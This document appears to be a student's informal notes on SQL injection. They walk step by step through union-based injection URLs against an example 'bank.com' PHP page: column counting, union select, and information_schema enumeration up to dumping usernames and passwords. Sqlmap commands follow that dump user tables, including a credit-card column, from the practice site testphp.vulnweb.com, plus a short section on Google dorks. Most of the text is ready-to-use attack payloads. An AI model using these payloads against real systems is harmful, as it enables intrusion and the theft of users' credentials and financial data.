Union Based Sql Injection
=========================

Target -> From front end  of the website we have to reach to Database

Technology -> PHP

Database -> MySql

Step 1: Find Get Method

in url -> 

?id=10
?id=9
?uid=6
?uname=palvinder
?product=milk
?clothes=jena

?something=somthing


Check every possibl option available on website

login
search
link (10000) <- 
submit 

www.bank.com/hello.php?id=3&&submit

Step 2: Check exceptional handling (Error)

www.bank.com/hello.php?id=3'&&submit

?id=3'

Check if any error, any change, any data missing, any corrupt image etc is happening


This means Website is Vulnerabile

Step 3: Check No. of Columns

www.bank.com/hello.php?id=3' order by 1--+&&submit  <--- Should working

www.bank.com/hello.php?id=3' order by 2--+&&submit

www.bank.com/hello.php?id=3' order by 3--+&&submit

www.bank.com/hello.php?id=3' order by 4--+&&submit

www.bank.com/hello.php?id=3' order by 9--+&&submit <-- OK

www.bank.com/hello.php?id=3' order by 10--+&&submit    <--- Error

In our Case = 2 Columns


Step 4: Select all columns and check Vulnerabile one

Eg: If Column is 9
www.bank.com/hello.php?id=3' union select 1,2,3,4,5,6,7,8,9--+&&submit

In our Case:
www.bank.com/hello.php?id=3' union select 1,2--+&&submit

This will display random colum no. on screen

Those are Vulnerabile = 1,2


Step 5:  Get Name of database = database()

www.bank.com/hello.php?id=3' union select database(),2--+&&submit


Step 6:  Get version of database = version()

www.bank.com/hello.php?id=3' union select version(),2--+&&submit


Step 7: Get Table Name

information_schema   == Mother of database

table_name    --->>    information_schema.tables

Column_name ---->> information_schema.columns


www.bank.com/hello.php?id=3' union select table_name,2 from information_schema.tables--+&&submit

Output -> List of Tables 

Choose -> users, password, credentials, login, customer etc

Which seemms to be havig important infomation

Step 8: Columns

www.bank.com/hello.php?id=3' union select column_name,2 from information_schema.columns where table_name="users"--+&&submit

user, password


Step 9: Get Data


www.bank.com/hello.php?id=3' union select user,password from users--+&&submit

======================================================

Security Level : Medium


Queries will not get exected with exceptional handling

Remove ' from url

Lucid3usL4b5

testphp.vulnweb.com


Error Based Injection:
======================


Database -> Tables -> Columns -> Data


Technology - ASP or aspx

Database - MSSQL

Drwaback for sql Injection:

1. We cant get all table/columns name at once


Automated Tool for SQL Injection

40+ Types of Injection

SQLMAP -> Kali Linux

Requiremet -> Kali Linux, target

Terminal -> 

Step 1: Get Database from Website

#sqlmap -u http://Website-With-Get-Method --dbs

available databases [2]:
[*] acuart     <-----
[*] information_schema


Step 2: Get Tables from acuart

#sqlmap -u http://Website-With-Get-Method --tables -D acuart


Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |  <------
+-----------+



Step 3: Get Columns

#sqlmap -u http://Website-With-Get-Method --columns -T users -D acuart


Database: acuart
Table: users
[8 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| name    | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+

Step 4: Get Data

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dump -C uname,pass -T users -D acuart


Google Hacking | Dorks
======================

This is method of filterig out particular results from the googl, by just avoiding unwanted.

Google -> Hacking

Blue - Title -> intitle:hacking

Green - url -> inurl:hacking

black - text  -> intext:hacking


filetype:

indexof:/bollywood/2017